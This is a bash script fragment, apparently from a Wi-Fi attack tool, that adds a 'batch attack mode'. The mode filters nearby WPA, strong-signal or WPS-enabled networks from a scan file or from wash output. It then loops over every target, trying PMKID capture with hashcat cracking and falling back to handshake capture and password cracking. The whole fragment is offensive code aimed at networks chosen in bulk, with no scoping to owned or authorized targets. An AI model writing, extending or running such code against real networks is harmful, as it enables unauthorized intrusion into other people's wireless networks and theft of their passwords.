# Batch Mode - Automated Multi-Target Attack

batch_attack_mode() {
    log_info "Batch Mode - Automated Multi-Target Attack"
    echo ""
    echo "Attack all networks matching criteria"
    echo ""
    
    # Filter criteria
    echo "Filter options:"
    echo "  1) Attack all WPA/WPA2 networks"
    echo "  2) Attack networks with signal > -70 dBm"
    echo "  3) Attack WPS-enabled networks only"
    echo "  4) Custom filter"
    echo ""
    
    read -p "Select filter [1]: " filter
    filter=${filter:-1}
    
    # Get list of targets from scan
    local targets=()
    
    case $filter in
        1) targets=($(get_wpa_networks)) ;;
        2) targets=($(get_strong_networks)) ;;
        3) targets=($(get_wps_networks)) ;;
        4) 
            read -p "Minimum signal strength: " min_sig
            targets=($(get_networks_by_signal "$min_sig"))
            ;;
    esac
    
    log_info "Found ${#targets[@]} targets matching criteria"
    
    # Attack each target
    for target in "${targets[@]}"; do
        # Parse target (BSSID:CHANNEL:ESSID)
        TARGET_BSSID=$(echo "$target" | cut -d':' -f1)
        TARGET_CHANNEL=$(echo "$target" | cut -d':' -f2)
        TARGET_ESSID=$(echo "$target" | cut -d':' -f3-)
        
        log_info "Attacking: $TARGET_ESSID ($TARGET_BSSID)"
        
        # Try PMKID first (fastest)
        if attack_pmkid; then
            crack_hashcat || crack_password
        else
            # Fall back to handshake
            capture_handshake && crack_password
        fi
        
        # Move to next regardless of success
    done
    
    # Show batch results
    display_statistics
}

get_wpa_networks() {
    # Parse scan file for WPA networks
    local scan_file="${OUTPUT_DIR}/scan-01-01.csv"
    
    if [ -f "$scan_file" ]; then
        grep -i "WPA" "$scan_file" | awk -F',' '{print $1":"$4":"$14}' | tr -d ' '
    fi
}

get_strong_networks() {
    local scan_file="${OUTPUT_DIR}/scan-01-01.csv"
    
    if [ -f "$scan_file" ]; then
        awk -F',' '$9 > -70 {print $1":"$4":"$14}' "$scan_file" | tr -d ' '
    fi
}

get_wps_networks() {
    # Scan for WPS-enabled networks using wash
    if command -v wash &> /dev/null; then
        timeout 30 wash -i "$MONITOR_INTERFACE" | awk '{print $1":"$2":"$6}' | tail -n +3
    fi
}

get_networks_by_signal() {
    local min_signal="$1"
    local scan_file="${OUTPUT_DIR}/scan-01-01.csv"
    
    if [ -f "$scan_file" ]; then
        awk -F',' -v min=$min_signal '$9 > min {print $1":"$4":"$14}' "$scan_file" | tr -d ' '
    fi
}
